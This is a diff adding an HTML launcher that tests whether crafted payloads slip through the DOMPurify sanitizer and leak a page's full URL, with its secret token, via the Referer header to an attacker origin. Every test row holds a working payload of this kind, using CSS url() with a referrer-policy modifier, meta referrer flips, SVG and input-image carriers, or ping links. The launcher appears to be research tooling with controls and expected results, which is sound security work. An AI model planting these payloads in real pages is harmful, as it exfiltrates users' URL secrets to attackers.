@@ -1,0 +1,165 @@
+<!doctype html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>DOMPurify referrer-leak — test launcher</title>
+<script src="config.js"></script>
+<style>
+  body{font:14px/1.5 system-ui,sans-serif;margin:24px;max-width:1100px}
+  table{border-collapse:collapse;width:100%;margin-top:12px}
+  th,td{border:1px solid #ddd;padding:6px 8px;vertical-align:top;font-size:13px}
+  th{background:#f4f4f4;text-align:left}
+  tr.control td{background:#eef7ff}
+  tr.t1 td{background:#f5fff0}
+  tr.t2 td{background:#fff8ec}
+  tr.chain td{background:#f7f0ff}
+  tr.cfg td{background:#fff0f0}
+  a.run{display:inline-block;padding:3px 8px;background:#1a56db;color:#fff;border-radius:4px;text-decoration:none;font-size:12px}
+  a.run2{background:#8b5cf6}
+  code{background:#eee;padding:1px 4px;border-radius:3px;font-size:12px}
+  .warn{background:#fee;border:1px solid #f88;padding:8px;border-radius:6px}
+  .ok{color:#080}.no{color:#a00}.cond{color:#a60}
+  .note{color:#666;font-size:12px}
+</style>
+</head>
+<body>
+<h2>DOMPurify referrer-leak — test launcher</h2>
+<p>Attacker base (from <code>config.js</code>): <b id="atk"></b></p>
+<div id="samewarn" class="warn" style="display:none">
+  &#9888; The attacker base looks like it matches this page's origin. Requests will be
+  <b>same-origin</b> and referrers are never trimmed &mdash; every test would falsely "leak".
+  Point <code>config.js</code> at a different host/port.
+</div>
+
+<p class="note">
+Each <b>Run</b> opens the victim page with a unique token <code>code=LEAK_TCxx</code> in its URL and the
+payload in <code>q</code>. Run every row, then check your attacker log (<code>check_logs.py</code> or grep).
+A test <b>LEAKED</b> if the logged <em>Referer</em> for it contains <code>code=LEAK_TCxx</code> (full URL);
+it did <b>not</b> leak if the Referer is only the origin.
+</p>
+<p class="note">
+Expected columns assume Chrome/Chromium &ge; 150 and Safari &ge; 26.2 (needed for the CSS
+<code>referrer-policy()</code> modifier). <b class="cond">cond</b> = conditional on Safari: needs a
+non-ITP-classified attacker domain and standard (not Private / Advanced-Protection) browsing &mdash; confirm live.
+Controls <b>must</b> show "no leak"; if a control leaks, your setup is same-origin or misconfigured.
+</p>
+
+<table id="tbl">
+<thead><tr>
+  <th>ID</th><th>What it tests</th><th>Chrome</th><th>Safari</th><th>Run</th><th>Note</th>
+</tr></thead>
+<tbody></tbody>
+</table>
+
+<script>
+var ATK = window.ATTACKER_ORIGIN;
+document.getElementById("atk").textContent = ATK;
+try {
+  var a = new URL(ATK, location.href);
+  if (a.origin === location.origin) document.getElementById("samewarn").style.display = "block";
+} catch(e){}
+
+// canonical test cases (single source of truth). __ATK__ is replaced with ATK.
+// endpoints are selected by ?ep=  (log|redir|font|click) so NO server rewrites are needed.
+var TESTS = [
+ {id:"TC00", cls:"control", name:"Control: plain <img>, NO policy flip",
+  chrome:"no leak", safari:"no leak", note:"baseline. Must be origin-only.",
+  payload:`<img src="__ATK__?tc=TC00&ep=log">`},
+
+ {id:"TC00b", cls:"control", name:"Control: CSS background-image, NO modifier",
+  chrome:"no leak", safari:"no leak", note:"baseline for CSS. Must be origin-only.",
+  payload:`<div style="width:1px;height:1px;background-image:url('__ATK__?tc=TC00b&ep=log')"></div>`},
+
+ {id:"TC01", cls:"t1", name:"T1: inline style background-image + referrer-policy(unsafe-url)",
+  chrome:"LEAK", safari:"LEAK (cond)", note:"blog technique 1a",
+  payload:`<div style="width:1px;height:1px;background-image:url('__ATK__?tc=TC01&ep=log' referrer-policy(unsafe-url))"></div>`},
+
+ {id:"TC02", cls:"cfg", name:"T1(cfg): <style>* background-image + modifier",
+  chrome:"needs <style>", safari:"needs <style>", note:"blog technique 1b, but DEFAULT DOMPurify strips <style> entirely (false positive on default). Use Run(style). Once <style> is allowed, whether the RULE survives DOMPurify's CSS sanitizer is browser-dependent — confirm live.",
+  payload:`<style>*{background-image:url('__ATK__?tc=TC02&ep=log' referrer-policy(unsafe-url))}</style>`, cfg:"style"},
+
+ {id:"TC03", cls:"cfg", name:"T1(cfg): ::before content:url() carrier",
+  chrome:"needs <style>", safari:"needs <style>", note:"pseudo-element fetch; requires <style> allowed (stripped on default). Use Run(style).",
+  payload:`<style>#c3::before{content:url('__ATK__?tc=TC03&ep=log' referrer-policy(unsafe-url))}</style><span id="c3"></span>`, cfg:"style"},
+
+ {id:"TC04", cls:"t1", name:"T1: list-style-image carrier",
+  chrome:"LEAK", safari:"LEAK (cond)", note:"list marker fetch",
+  payload:`<ul style="list-style-image:url('__ATK__?tc=TC04&ep=log' referrer-policy(unsafe-url))"><li>item</li></ul>`},
+
+ {id:"TC05", cls:"t1", name:"T1: border-image-source carrier",
+  chrome:"LEAK", safari:"LEAK (cond)", note:"border image fetch",
+  payload:`<div style="border-image-source:url('__ATK__?tc=TC05&ep=log' referrer-policy(unsafe-url));border:10px solid #000;width:20px;height:20px"></div>`},
+
+ {id:"TC06", cls:"t1", name:"T1: mask-image / -webkit-mask-image carrier",
+  chrome:"LEAK", safari:"LEAK (cond)", note:"mask fetch",
+  payload:`<div style="width:20px;height:20px;background:red;-webkit-mask-image:url('__ATK__?tc=TC06&ep=log' referrer-policy(unsafe-url));mask-image:url('__ATK__?tc=TC06&ep=log' referrer-policy(unsafe-url))"></div>`},
+
+ {id:"TC07", cls:"t1", name:"T1: cursor:url() carrier (HOVER)",
+  chrome:"LEAK on hover", safari:"LEAK (cond)", note:"HOVER the grey box to fire the fetch",
+  payload:`<div style="width:80px;height:80px;background:#ccc;cursor:url('__ATK__?tc=TC07&ep=log' referrer-policy(unsafe-url)),auto">HOVER ME</div>`},
+
+ {id:"TC08", cls:"cfg", name:"T1(cfg): @font-face src carrier",
+  chrome:"needs <style>", safari:"needs <style>", note:"@font-face can only live in a <style> block, so requires <style> allowed (stripped on default). Use Run(style). Font fetch — image-only monitors miss it.",
+  payload:`<style>@font-face{font-family:tc8;src:url('__ATK__?tc=TC08&ep=font' referrer-policy(unsafe-url))}#c8{font-family:tc8}</style><span id="c8">rendered text</span>`, cfg:"style"},
+
+ {id:"TC20", cls:"t2", name:"T2: <meta name=referrer unsafe-url> + <img>",
+  chrome:"LEAK", safari:"no leak (by design)", note:"blog technique 2. Safari DOMParser is isolated.",
+  payload:`<meta name="referrer" content="unsafe-url"><img src="__ATK__?tc=TC20&ep=log">`},
+
+ {id:"TC21", cls:"t2", name:"T2: <meta http-equiv=referrer unsafe-url> + <img>",
+  chrome:"LEAK", safari:"no leak (by design)", note:"http-equiv variant",
+  payload:`<meta http-equiv="referrer" content="unsafe-url"><img src="__ATK__?tc=TC21&ep=log">`},
+
+ {id:"TC22", cls:"t2", name:"T2: meta flip + SVG <image> carrier",
+  chrome:"LEAK", safari:"no leak (by design)", note:"svg/image survive DOMPurify",
+  payload:`<meta name="referrer" content="unsafe-url"><svg width="10" height="10"><image href="__ATK__?tc=TC22&ep=log" width="10" height="10"></image></svg>`},
+
+ {id:"TC23", cls:"t2", name:"T2: meta flip + <input type=image> carrier",
+  chrome:"LEAK", safari:"no leak (by design)", note:"input/type/src survive DOMPurify",
+  payload:`<meta name="referrer" content="unsafe-url"><input type="image" src="__ATK__?tc=TC23&ep=log">`},
+
+ {id:"TC24", cls:"t2", name:"T2: meta flip + PLAIN CSS bg (no modifier)",
+  chrome:"LEAK", safari:"no leak (by design)", note:"page-wide flip vs TC00b",
+  payload:`<meta name="referrer" content="unsafe-url"><div style="width:1px;height:1px;background-image:url('__ATK__?tc=TC24&ep=log')"></div>`},
+
+ {id:"TC30", cls:"chain", name:"Chain: full URL survives a 302 redirect (T1 modifier)",
+  chrome:"LEAK via redirect", safari:"LEAK (cond)", note:"log shows via=redirect_hit",
+  payload:`<div style="width:1px;height:1px;background-image:url('__ATK__?tc=TC30&ep=redir' referrer-policy(unsafe-url))"></div>`},
+
+ {id:"TC40", cls:"cfg", name:"Config-dep: referrerpolicy= attribute on <img>",
+  chrome:"no leak (stripped)", safari:"no leak (stripped)", note:"FALSE POSITIVE on default config. Purple run = addattr config, then it leaks.",
+  payload:`<img src="__ATK__?tc=TC40&ep=log" referrerpolicy="unsafe-url">`, cfg:"addattr"},
+
+ {id:"TC41", cls:"cfg", name:"Config-dep: <a ping> (needs CLICK)",
+  chrome:"no leak (stripped)", safari:"no leak (stripped)", note:"ping stripped on default; CLICK the link. Purple run = addattr. Leak arrives as POST (Ping-From).",
+  payload:`<a href="__ATK__?tc=TC41&ep=click" ping="__ATK__?tc=TC41&ep=log">CLICK TC41</a>`, cfg:"addattr"}
+];
+
+function runURL(t, cfg){
+  var pl = t.payload.split("__ATK__").join(ATK);
+  var u = "victim.html?code=LEAK_" + t.id + "&q=" + encodeURIComponent(pl);
+  if (cfg) u += "&cfg=" + cfg;
+  return u;
+}
+
+var tb = document.querySelector("#tbl tbody");
+TESTS.forEach(function(t){
+  var tr = document.createElement("tr");
+  tr.className = t.cls;
+  var runs = '<a class="run" target="_blank" href="'+runURL(t)+'">Run</a>';
+  if (t.cfg)
+    runs += ' <a class="run run2" target="_blank" href="'+runURL(t,t.cfg)+'">Run ('+t.cfg+')</a>';
+  var cc = t.chrome.indexOf("LEAK")>=0 ? "ok" : "no";
+  var sc = t.safari.indexOf("LEAK")>=0 ? (t.safari.indexOf("cond")>=0?"cond":"ok") : "no";
+  tr.innerHTML =
+    "<td><b>"+t.id+"</b></td>"+
+    "<td>"+t.name+"</td>"+
+    '<td class="'+cc+'">'+t.chrome+"</td>"+
+    '<td class="'+sc+'">'+t.safari+"</td>"+
+    "<td>"+runs+"</td>"+
+    '<td class="note">'+t.note+"</td>";
+  tb.appendChild(tr);
+});
+</script>
+</body>
+</html>
